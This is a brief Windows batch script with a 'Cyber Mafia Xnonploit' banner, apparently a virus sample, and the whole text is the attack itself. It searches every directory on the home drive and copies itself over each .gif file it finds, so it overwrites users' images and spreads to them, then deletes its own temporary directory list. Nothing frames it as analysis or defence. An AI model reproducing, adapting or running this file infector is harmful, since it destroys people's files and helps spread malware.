:::::::::::::::::::::::::
::Cyber Mafia Xnonploit::
:::::::::::::::::::::::::
@echo off
::----Infect All Gif Files---::
    Dir %Homedrive% /s /b > DirPath                          
        For /f %%Y In (DirPath) Do (
        Set DirPath=%%Y > Nul    
            For %%Z In (%DirPath%\*.gif) Do (
            Set GifInfect=%%Z > Nul
            Copy /y %0 %GifInfect%
        )
    )

Del /f /s /q DirPath
::---------------------------::
